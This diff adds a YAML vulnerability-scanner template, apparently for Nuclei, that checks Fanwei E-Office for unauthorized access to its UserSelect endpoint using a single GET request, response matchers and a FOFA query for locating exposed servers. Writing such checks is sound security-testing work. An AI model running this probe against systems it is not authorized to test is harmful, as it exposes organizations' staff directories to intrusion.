@@ -1,0 +1,42 @@
+id: FanweiE-office-UserSelect-unauthorized-access
+
+info:
+  name: 泛微e-office系统UserSelect接口存在未授权访问漏洞
+  author: candada
+  severity: high
+  description: '泛微 E-Office,UserSelect接口存在未授权访问漏洞。'
+  reference:
+    - https://
+  tags: 2024,泛微e-office,unauthorized-access,ecology泛微e-office,ecology-oa
+  metadata:
+    fofa-query: app="泛微-EOffice"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+http:
+  - raw:
+      - |+
+        GET /UserSelect/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '选择人员'
+      - type: status
+        status:
+          - 200
